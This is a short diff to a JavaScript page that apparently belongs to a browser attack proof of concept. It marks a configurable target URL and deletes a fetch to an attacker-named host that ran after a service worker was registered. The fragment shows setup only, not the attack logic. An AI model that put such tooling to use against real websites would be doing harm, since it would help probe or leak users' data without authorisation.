@@ -46,7 +46,7 @@
         }
       }
 
-      var base = 'https://georgetian.com';
+      var base = 'https://georgetian.com'; // set target URL here
 
       var sizes = [
         10,
@@ -89,7 +89,6 @@
       if ('serviceWorker' in navigator) {
         addEventListener('load', async () => {
           await navigator.serviceWorker.register('serviceworker.js');
-          await fetch('https://attacker.georgetian.com/reset');
           setTimeout(run, 1000);
         });
 			} else {
